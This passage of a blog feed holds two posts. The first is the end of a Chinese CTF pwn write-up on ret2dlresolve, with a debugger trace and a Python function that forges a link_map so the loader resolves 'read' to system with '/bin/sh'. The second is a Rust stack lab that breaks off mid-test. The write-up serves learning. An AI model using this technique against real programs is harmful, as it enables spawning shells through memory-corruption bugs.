function">ElfW</span><span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span>l_info<span class="token punctuation">[</span>DT_NUM <span class="token operator">+</span> DT_THISPROCNUM <span class="token operator">+</span> DT_VERSIONTAGNUM <span class="token operator">+</span> DT_EXTRANUM <span class="token operator">+</span> DT_VALNUM <span class="token operator">+</span> DT_ADDRNUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/*保存Elfxx_Dyn结构体指针的列表，用来寻找各节基址；如l_info[DT_STRTAB]指向保存着函数解析字符串表基址的Elfxx_Dyn结构体。*/</span>    <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Phdr<span class="token punctuation">)</span> l_phdr<span class="token punctuation">;</span>              <span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> l_entry<span class="token punctuation">;</span>                     <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> l_phnum<span class="token punctuation">;</span>                       <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> l_ldnum<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来需要理解_dl_runtime_resolve如何利用link_map和offset完成符号解析，这一步主要依靠_dl_fixup部分完成，参数同上，返回真实地址</p><p>其中调用了_dl_lookup_symbol_x函数，可以看到：<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">► 0x7552d64c2bf7 &lt;_dl_fixup+263&gt;    call   _dl_lookup_symbol_x         &lt;_dl_lookup_symbol_x&gt;       rdi: 0x3fe501 ◂— 0x6474730064616572 &#x2F;* &#39;read&#39; *&#x2F;       rsi: 0x7552d64e92e0 ◂— 0       rdx: 0x7fff15cca570 —▸ 0x3fe460 ◂— 0x1200000011       rcx: 0x7552d64e9680 —▸ 0x7552d64e95d8 —▸ 0x7552d64ae6c0 —▸ 0x7552d64e92e0 ◂— 0       r8: 0x7552d64ae710 —▸ 0x3fe52d ◂— &#39;GLIBC_2.2.5&#39;       r9: 1       arg[6]: 1       arg[7]: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>rdi中存的是.dynstr 段中的”read”字符串，rsi中是link_map首地址，rdx指向0x3fe460，是.dynsym 段对应read的部分：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">_dl_lookup_symbol_x</span> <span class="token punctuation">(</span>undef_name<span class="token operator">=</span><span class="token number">0x3fe501</span> <span class="token string">"read"</span><span class="token punctuation">,</span>    undef_map<span class="token operator">=</span>undef_map@entry<span class="token operator">=</span><span class="token number">0x7552d64e92e0</span><span class="token punctuation">,</span>    ref<span class="token operator">=</span>ref@entry<span class="token operator">=</span><span class="token number">0x7fff15cca570</span><span class="token punctuation">,</span> symbol_scope<span class="token operator">=</span><span class="token number">0x7552d64e9680</span><span class="token punctuation">,</span>    version<span class="token operator">=</span><span class="token number">0x7552d64ae710</span><span class="token punctuation">,</span> type_class<span class="token operator">=</span>type_class@entry<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>    skip_map<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>接下来考虑利用，也就是用假的link_map将read解析成system填入got表</p><p>此题的fake_link_map:<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fake_Linkmap_payload</span><span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">,</span>known_func_ptr<span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># &amp;(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误</span>    <span class="token comment"># offset = l_addr =  libc.sym['system'] -libc.sym['setbuf']  </span>    <span class="token comment"># symbol_addr = setbuf_addr + (system_addr - setbuf_addr) = system_addr</span>    <span class="token comment"># l_addr = -769472, 通常为负数</span>    linkmap <span class="token operator">=</span> p64<span class="token punctuation">(</span>offset <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#l_addr</span>    <span class="token comment"># fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 可以为任意值</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 这里的值就是伪造的.rel.plt的地址</span>    <span class="token comment"># fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">-</span> offset<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 </span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span>     <span class="token comment"># Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment"># Rela->r_addend,任意值都行</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment">#l_ns</span>    <span class="token comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 参考IDA上.dyamisc的结构</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>known_func_ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment"># 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8</span>    linkmap <span class="token operator">+=</span> <span class="token string">b'/bin/sh\x00'</span>    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">)</span> <span class="token comment"># fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment"># fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址</span>    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span>    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment"># fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址</span>    <span class="token keyword">return</span> linkmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>（有待进一步学习，yield()）</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;一份&lt;del&gt;迟到的&lt;/del&gt;不必要的WP，同时也是回顾si进pwn的世界的第一个月&lt;/p&gt;
&lt;h3 id=&quot;0-二进制漏洞审计入门指北&quot;&gt;&lt;a href=&quot;#0-二进制漏洞审计入门指北&quot; class=&quot;headerlink&quot; title=&quot;0</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-栈实验</title>
    <link href="https://aucept.in/2025/10/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/10/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-10-13T02:42:03.000Z</published>
    <updated>2025-10-18T05:48:00.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p>一个栈结构体要有：<code>栈底指针``栈顶指针``可用最大容量</code>三个字段……指针是什么东西啊？rust崩溃</p><p>换个角度想，栈就是只能在一端进行增删操作的线性表，course.rs里给出了单向链表的实现，但为何非要链表？也许可以用Box模拟：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Stack</span> <span class="token punctuation">&#123;</span>    base <span class="token punctuation">:</span> <span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">,</span>    top <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    size <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Box&lt;[i32]&gt;分配一个堆上的定长i32切片，但是定长并不能满足需求，大致有两种思路，一是利用vec完成不定长的部分再转换回定长切片，二是利用unsafe代码手动分配内存</p><p>使用vec!来简化实现：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Stack</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>size <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span><span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> base  <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> size<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">into_boxed_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Stack</span><span class="token punctuation">&#123;</span>            base<span class="token punctuation">,</span>            top <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">realloc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> new_size <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> base <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> new_size<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">into_boxed_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span><span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token punctuation">&#123;</span>            base<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>base<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>base <span class="token operator">=</span> base<span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token operator">=</span> new_size<span class="token punctuation">;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// full</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">>=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">realloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// push</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>base<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"top: &#123;&#125;"</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>top<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// empty</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"Stack underflow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>base<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试如下：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token class-name">Stack</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token punctuation">;</span>    <span class="token comment">// new 后栈应为空，pop 应返回错误</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_new_initial_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"new stack should be empty"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// push 多个元素后，pop 应按 LIFO 返回</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_push_and_pop_lifo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"stack should be empty after popping all elements"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// push 的数量超过初始容量，验证能正常工作（隐式测试扩容）</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_push_resizes_and_handles_more_than_initial_capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..=</span><span class="token number">10</span> <span class="token punctuation">&#123;</span>            s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">..=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"stack should be empty after popping all elements"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 单次 push 后 pop 返回相同值</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_push_single_then_pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"stack should be empty after popping the single element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来就可以正式开始实验了：</p><h2 id="（一）-数制转换问题"><a href="#（一）-数制转换问题" class="headerlink" title="（一） 数制转换问题"></a>（一） 数制转换问题</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>将十进制数N和其它d进制数的转换是计算机实现计算的基本问题，其解决方案很多，其中最简单方法基于下列原理：即除d取余法。例如：（1348）10 = （2504）8</p><h4 id="10进制转换8进制过程"><a href="#10进制转换8进制过程" class="headerlink" title="10进制转换8进制过程"></a>10进制转换8进制过程</h4><div class="table-container"><table><thead><tr><th>N</th><th>N div 8</th><th>N mod 8</th></tr></thead><tbody><tr><td>1348</td><td>168</td><td>4</td></tr><tr><td>168</td><td>21</td><td>0</td></tr><tr><td>21</td><td>2</td><td>5</td></tr><tr><td>2</td><td>0</td><td>2</td></tr></tbody></table></div><p>从表中可以看出，最先产生的余数4是转换结果的最低位，这正好符合栈的后进先出（LIFO）的特性。所以可以用顺序栈来模拟这个过程。</p><h4 id="基本要求"><a href="#基本要求" class="headerlink" title="基本要求"></a>基本要求</h4><p>对于键盘输入的任意一个非负的十进制整数，打印输出与其等值的八进制数。由于上述的计算过程是从低位到高位顺序产生的八进制数的各个数位，而打印输出，一般来说应从高位到低位进行，恰好和计算过程相反。因此可以先将计算过程中得到的八进制数的各位进栈，待相对应的八进制数的各位均产生以后，再使其按顺序出栈，并打印输出。即得到了与输入的十进制数相对应的八进制数。</p><h4 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h4><p>依据软件工程的测试技术自己确定，注意测试边界数据。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>在实现了基本操作后，顺理成章：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">trans</span><span class="token punctuation">(</span>dec <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> value <span class="token operator">=</span> dec<span class="token punctuation">;</span>    <span class="token keyword">if</span> value <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> value <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> m <span class="token operator">=</span> value <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        value <span class="token operator">=</span> value <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token operator">!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>top <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_trans</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span><span 